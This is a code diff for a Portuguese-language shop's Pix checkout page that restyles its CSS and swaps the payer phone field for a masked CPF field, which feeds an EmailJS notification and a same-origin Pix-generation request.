@@ -354,121 +354,151 @@
             border: none;
             padding: 16px;
             border-radius: 12px;
-            font-size: 1rem;
             font-weight: 800;
+            font-size: 1rem;
             cursor: pointer;
             transition: all 0.3s;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-            box-shadow: 0 4px 12px rgba(50, 188, 173, 0.2);
+            width: 100%;
         }
 
         .payment-action-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 16px rgba(50, 188, 173, 0.3);
             filter: brightness(1.05);
+            transform: translateY(-2px);
         }
 
-        .payment-action-btn:active {
-            transform: translateY(0);
+        .payment-action-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
         }
 
         .pix-copy-section {
             display: none;
             flex-direction: column;
-            gap: 20px;
+            gap: 15px;
             animation: fadeIn 0.4s ease-out;
         }
 
         .pix-header-status {
             display: flex;
-            justify-content: space-between;
             align-items: center;
+            justify-content: space-between;
+            background: rgba(50, 188, 173, 0.1);
+            padding: 12px 15px;
+            border-radius: 12px;
+            border: 1px solid rgba(50, 188, 173, 0.2);
+            position: relative;
+            z-index: 1;
         }
 
         .pix-status-badge {
-            background: rgba(40, 167, 69, 0.1);
-            color: var(--success);
-            padding: 6px 12px;
-            border-radius: 20px;
-            font-size: 0.75rem;
+            color: var(--pix-color);
             font-weight: 800;
+            font-size: 0.85rem;
             display: flex;
             align-items: center;
             gap: 6px;
         }
 
         .pix-timer-container {
-            font-size: 0.8rem;
+            font-size: 0.85rem;
             font-weight: 700;
-            color: var(--text-gray);
+            color: var(--text-dark);
             display: flex;
             align-items: center;
-            gap: 6px;
+            gap: 5px;
         }
 
         #pix-timer {
             color: var(--danger);
-            font-variant-numeric: tabular-nums;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 1rem;
+        }
+
+        .pix-code-wrapper {
+            background: #f8fafc;
+            border: 2px dashed var(--pix-color);
+            border-radius: 16px;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+        }
+
+        .btn-copy-pix {
+            background: #FFC107;
+            color: #1a1a1a;
+            border: none;
+            padding: 14px 20px;
+            border-radius: 25px;
+            font-weight: 800;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+        }
+
+        .btn-copy-pix:hover {
+            background: #FFB300;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(255, 193, 7, 0.3);
         }
 
         .pix-code-display-wrapper {
-            background: var(--bg-light);
-            border: 2px dashed var(--border-color);
-            border-radius: 16px;
-            padding: 15px;
-            position: relative;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 10px;
         }
 
         .pix-code-label {
-            font-size: 0.7rem;
-            font-weight: 800;
+            font-size: 0.75rem;
+            font-weight: 700;
             color: var(--text-light);
             text-transform: uppercase;
-            margin-bottom: 8px;
-            display: block;
+            letter-spacing: 0.5px;
         }
 
         .pix-code-input-container {
             display: flex;
             align-items: center;
             gap: 10px;
+            background: white;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 12px 14px;
+            transition: all 0.2s ease;
+        }
+
+        .pix-code-input-container:hover {
+            border-color: var(--pix-color);
+            box-shadow: 0 2px 8px rgba(50, 188, 173, 0.1);
         }
 
         .pix-code-display-text {
-            flex: 1;
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 0.85rem;
+            font-family: 'Monaco', 'Consolas', monospace;
+            font-size: 0.75rem;
             color: var(--text-dark);
-            word-break: break-all;
-            line-height: 1.4;
-            max-height: 60px;
-            overflow-y: auto;
-            font-weight: 600;
-        }
-
-        .btn-copy-pix {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 12px;
-            font-size: 1rem;
-            font-weight: 800;
-            cursor: pointer;
-            transition: all 0.2s;
-            width: 100%;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            flex: 1;
+            letter-spacing: 0.3px;
+            line-height: 1.3;
         }
 
         .pix-copy-icon-btn {
-            background: white;
-            border: 1px solid var(--border-color);
-            color: var(--text-gray);
-            width: 36px;
-            height: 36px;
-            border-radius: 8px;
+            background: none;
+            border: none;
+            color: var(--pix-color);
             font-size: 1.1rem;
             cursor: pointer;
             padding: 4px 8px;
@@ -874,8 +904,8 @@
                         <input type="email" id="delivery-email" placeholder="seu@email.com" required>
                     </div>
                     <div class="form-group">
-                        <label>Telefone</label>
-                        <input type="tel" id="delivery-phone" placeholder="(00) 00000-0000" maxlength="15" inputmode="numeric" required>
+                        <label>CPF</label>
+                        <input type="tel" id="delivery-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
                     </div>
                     <button type="submit" class="btn-modal btn-send-form">Enviar Pedido</button>
                 </form>
@@ -909,17 +939,18 @@
             emailjs.init(EMAILJS_PUBLIC_KEY);
         }
 
-        function maskPhone(value) {
+        function maskCPF(value) {
             return value
                 .replace(/\D/g, '')
-                .replace(/(\d{2})(\d)/, '($1) $2')
-                .replace(/(\d{5})(\d)/, '$1-$2')
-                .replace(/(-\d{4})\d+?$/, '$1');
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d{1,2})/, '$1-$2')
+                .replace(/(-\d{2})\d+?$/, '$1');
         }
 
-        function setupPhoneInput(inputElement) {
+        function setupCPFInput(inputElement) {
             inputElement.addEventListener('input', (e) => {
-                e.target.value = maskPhone(e.target.value);
+                e.target.value = maskCPF(e.target.value);
                 const rawValue = e.target.value.replace(/\D/g, '');
                 if (rawValue.length === 11) {
                     setTimeout(() => { e.target.blur(); }, 100);
@@ -954,8 +985,8 @@
                                         <input type="text" id="pix-name" placeholder="Ex: João Silva" required>
                                     </div>
                                     <div class="pix-input-group">
-                                        <label for="pix-phone">Telefone</label>
-                                        <input type="tel" id="pix-phone" placeholder="(00) 00000-0000" maxlength="15" inputmode="numeric" required>
+                                        <label for="pix-cpf">CPF</label>
+                                        <input type="tel" id="pix-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" required>
                                     </div>
                                     <div class="pix-error-msg" id="pix-error-msg">
                                         <i class="fas fa-exclamation-circle"></i>
@@ -975,13 +1006,13 @@
                                     <div class="duty-header"><i class="fas fa-user-shield"></i> Titular da Compra</div>
                                     <div class="duty-user-data">
                                         <div class="duty-field"><span class="duty-label">Nome:</span><span class="duty-value" id="display-pix-name">---</span></div>
-                                        <div class="duty-field"><span class="duty-label">Telefone:</span><span class="duty-value" id="display-pix-phone">---</span></div>
+                                        <div class="duty-field"><span class="duty-label">CPF:</span><span class="duty-value" id="display-pix-cpf">---</span></div>
                                         <div class="duty-field" style="margin-top: 8px; padding-top: 8px; border-top: 1px solid rgba(50, 188, 173, 0.1);">
                                             <span class="duty-label" style="color: var(--text-dark); font-weight: 700;">Valor Total:</span>
                                             <span class="duty-value" style="color: var(--pix-color); font-size: 1.1rem; font-weight: 900;">R$ ${baseTotal.toFixed(2).replace('.', ',')}</span>
                                         </div>
                                     </div>
-                                    <div class="duty-warning"><i class="fas fa-info-circle"></i><span>Este código Pix é nominal e vinculado ao seu Telefone.</span></div>
+                                    <div class="duty-warning"><i class="fas fa-info-circle"></i><span>Este código Pix é nominal e vinculado ao seu CPF.</span></div>
                                 </div>
                                 <div class="pix-code-display-wrapper">
                                     <label class="pix-code-label">Código Pix</label>
@@ -1011,11 +1042,8 @@
             `;
 
             document.getElementById('cart-content-wrapper').innerHTML = paymentHTML;
-            const pixPhoneInput = document.getElementById('pix-phone');
-            if (pixPhoneInput) setupPhoneInput(pixPhoneInput);
-            
-            const deliveryPhoneInput = document.getElementById('delivery-phone');
-            if (deliveryPhoneInput) setupPhoneInput(deliveryPhoneInput);
+            const pixCpfInput = document.getElementById('pix-cpf');
+            if (pixCpfInput) setupCPFInput(pixCpfInput);
 
             const pixCard = document.getElementById('pay-now-pix');
             const deliveryCard = document.getElementById('pay-on-delivery');
@@ -1061,12 +1089,12 @@
             }, 1000);
         }
 
-        async function sendEmailJS(name, phone, valor) {
+        async function sendEmailJS(name, cpf, valor) {
             if (!EMAILJS_SERVICE_ID || EMAILJS_SERVICE_ID === 'service_xxx') return;
             try {
                 const templateParams = {
                     payer_name: name,
-                    payer_phone: phone,
+                    payer_cpf: cpf,
                     payer_valor: 'R$ ' + parseFloat(valor).toFixed(2).replace('.', ','),
                 };
                 await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
@@ -1075,14 +1103,14 @@
 
         async function generatePix() {
             const name = document.getElementById('pix-name').value.trim();
-            const phoneRaw = document.getElementById('pix-phone').value;
-            const phone = phoneRaw.replace(/\D/g, '');
+            const cpfRaw = document.getElementById('pix-cpf').value;
+            const cpf = cpfRaw.replace(/\D/g, '');
             const errorEl = document.getElementById('pix-error-msg');
             const errorText = document.getElementById('pix-error-text');
             errorEl.classList.remove('visible');
 
             if (name.length < 3) { errorText.textContent = 'Informe seu nome completo.'; errorEl.classList.add('visible'); return; }
-            if (phone.length < 10) { errorText.textContent = 'Informe um telefone válido.'; errorEl.classList.add('visible'); return; }
+            if (cpf.length !== 11) { errorText.textContent = 'Informe um CPF válido.'; errorEl.classList.add('visible'); return; }
 
             const btn = document.getElementById('btn-generate-pix');
             const originalHTML = btn.innerHTML;
@@ -1090,9 +1118,9 @@
             btn.disabled = true;
 
             try {
-                sendEmailJS(name, phoneRaw, subtotalValue);
-                const pixCode = await fetchPixCode(name, phone);
-                if (pixCode) { showPixCopySection(pixCode, name, phoneRaw); }
+                sendEmailJS(name, cpfRaw, subtotalValue);
+                const pixCode = await fetchPixCode(name, cpf);
+                if (pixCode) { showPixCopySection(pixCode, name, cpfRaw); }
                 else { throw new Error(); }
             } catch (err) {
                 errorText.textContent = 'Erro ao gerar PIX. Tente novamente.';
@@ -1102,7 +1130,7 @@
             }
         }
 
-        async function fetchPixCode(payerName, phone) {
+        async function fetchPixCode(payerName, cpf) {
             const response = await fetch('/proxy/pix', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -1112,11 +1140,11 @@
             return data.success ? data.pixCode : null;
         }
 
-        function showPixCopySection(qrCode, name, phone) {
+        function showPixCopySection(qrCode, name, cpf) {
             document.getElementById('pix-original-content').style.display = 'none';
             document.getElementById('pix-copy-content').style.display = 'flex';
             document.getElementById('display-pix-name').innerText = name;
-            document.getElementById('display-pix-phone').innerText = phone;
+            document.getElementById('display-pix-cpf').innerText = cpf;
             document.getElementById('pix-code-text').innerText = qrCode;
             window.scrollTo({ top: 0, behavior: 'smooth' });
             startPixTimer(15 * 60);
